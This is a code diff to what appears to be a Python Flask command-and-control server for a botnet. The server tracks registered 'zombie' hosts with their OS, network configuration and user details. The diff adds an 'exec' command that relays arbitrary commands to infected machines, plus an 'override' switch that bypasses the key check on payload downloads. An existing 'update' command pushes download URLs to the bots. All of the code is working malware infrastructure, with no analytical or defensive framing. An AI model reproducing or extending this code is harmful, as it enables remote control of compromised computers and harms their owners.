@@ -18,7 +18,8 @@ camo_html = 'camo.html'
 
 dl_key = ''
 valid = 0
-SERVER_URL = 'http://dev-4.lan/'
+override = False
+SERVER_URL = 'http://localhost:5000/'
 
 
 @app.route("/")
@@ -30,7 +31,7 @@ def index():
 def download(key):
     global dl_key
     global valid
-    if key == dl_key:
+    if key == dl_key or override:
         valid -= 1
         if not valid:
             dl_key = random_string(6)
@@ -53,10 +54,21 @@ def api():
             cmd = {'cmd': 'update', 'url': request.form.get('url', SERVER_URL + "dl/" + dl_key)}
             global valid
             valid = len(Zombie.select())
+        elif request.form['cmd'] == 'override':
+            global override
+            override = not override
+            cmd = None
+        elif request.form['cmd'] == 'exec':
+            cmd = {'cmd': 'exec', 'exec': request.form.get('exec')}
         if cmd:
             if request.form.get('who', 'all') == 'all':
                 for z in Zombie.select():
                     messages[z.id].put(cmd)
+            elif override and request.form.get('count'):
+                for i in range(int(request.form.get('count'))):
+                    if not messages.get(i):
+                        messages[i] = Queue()
+                    messages[i].put(cmd)
             else:
                 messages[int(request.form['who'])].put(cmd)
         return '', 204
@@ -101,8 +113,10 @@ def register():
     uuid = gen_uuid(post['i'])
     remote_addr = request.environ.get('HTTP_X_REAL_IP') or request.remote_addr
     try:
-        Zombie.create(uuid=uuid, os=post['o'], ifconfig=post['i'],
+        z = Zombie.create(uuid=uuid, os=post['o'], ifconfig=post['i'],
                       uid=int(post['u']), uname=post['k'], ip_addr=remote_addr)
+        if not messages.get(z.id):
+            messages[z.id] = Queue()
     except IntegrityError:
         print("Registration from existing zombie", uuid)
         pass
